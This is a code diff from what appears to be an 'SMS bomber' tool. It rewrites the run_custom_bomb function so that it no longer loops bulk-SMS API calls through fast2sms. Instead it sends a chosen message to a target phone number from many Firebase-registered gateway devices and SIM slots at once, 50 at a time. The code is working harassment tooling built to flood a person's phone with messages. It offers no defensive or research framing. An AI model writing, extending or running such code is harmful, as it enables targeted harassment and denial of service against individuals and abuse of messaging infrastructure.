@@ -151,61 +151,70 @@ async def run_api_bomb(phone: str, cycles: int = 1) -> dict:
 
     return {'total': total, 'success': success, 'failed': failed, 'phone': phone}
 
-# ─────────────────────────── Custom Bomb ───────────────────────────
-# Uses fast2sms free tier by default; swap the URL/params for any other SMS gateway.
+# ─────────────────────────── Custom Bomb (Firebase) ───────────────────────────
 
-async def run_custom_bomb(phone: str, message: str, count: int, api_key: str = None) -> dict:
+async def run_custom_bomb(phone: str, message: str, count: int, firebase_list: list = None) -> dict:
     """
-    Sends `message` to `phone` exactly `count` times.
-    Uses fast2sms.com API if api_key is set in admin_settings["fast2sms_key"].
-    Falls back to a simple stub if no key.
-    Returns {total, success, failed}.
+    Sends `message` to `phone` via Firebase SMS gateway devices.
+    Uses all active devices across all configured Firebase instances.
+    `count` caps the number of send tasks (each device × 2 SIM slots).
+    Returns {total, success, failed, phone, note}.
     """
+    from firebase_service import prepare_firebase_tasks
+    import httpx
+
     phone = ''.join(filter(str.isdigit, phone))
     if len(phone) == 10:
         phone = '91' + phone
 
-    success = failed = 0
-
-    if not api_key:
-        # No SMS gateway configured — return informative result
+    if not firebase_list:
         return {
             'total': 0,
             'success': 0,
             'failed': 0,
             'phone': phone,
-            'note': 'No SMS gateway key configured. Set fast2sms_key in admin panel.'
+            'note': 'No Firebase instances configured. Add one via Admin → Bomber Settings.',
         }
 
-    url = "https://www.fast2sms.com/dev/bulkV2"
-    headers = {"authorization": api_key, "Content-Type": "application/json"}
+    # Build task list (capped by count)
+    tasks = await prepare_firebase_tasks(firebase_list, phone, message, max_success=count)
 
-    connector = aiohttp.TCPConnector(limit=50, ssl=False)
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = []
-        for _ in range(count):
-            payload = {
-                "route": "q",
-                "message": message,
-                "language": "english",
-                "flash": 0,
-                "numbers": phone,
-            }
-            tasks.append(session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=8)))
+    if not tasks:
+        return {
+            'total': 0,
+            'success': 0,
+            'failed': 0,
+            'phone': phone,
+            'note': 'No active devices found across configured Firebase instances.',
+        }
 
-        # Batch in groups of 10 to avoid overwhelming the gateway
-        batch_size = 10
-        for i in range(0, len(tasks), batch_size):
-            batch = tasks[i:i+batch_size]
-            responses = await asyncio.gather(*[t for t in batch], return_exceptions=True)
-            for resp in responses:
-                if isinstance(resp, Exception):
-                    failed += 1
-                else:
-                    async with resp as r:
-                        if r.status == 200:
+    success = failed = 0
+    sem = asyncio.Semaphore(50)
+
+    async def do_put(task):
+        nonlocal success, failed
+        async with sem:
+            try:
+                import json as _json
+                async with aiohttp.ClientSession() as session:
+                    async with session.put(
+                        task["url"],
+                        data=task["data"],
+                        headers={**task["headers"], "Content-Type": "application/json"},
+                        timeout=aiohttp.ClientTimeout(total=15),
+                    ) as r:
+                        if r.status in (200, 201, 204):
                             success += 1
                         else:
                             failed += 1
+            except Exception:
+                failed += 1
 
-    return {'total': success + failed, 'success': success, 'failed': failed, 'phone': phone}
+    await asyncio.gather(*[do_put(t) for t in tasks])
+
+    return {
+        'total':   success + failed,
+        'success': success,
+        'failed':  failed,
+        'phone':   phone,
+    }
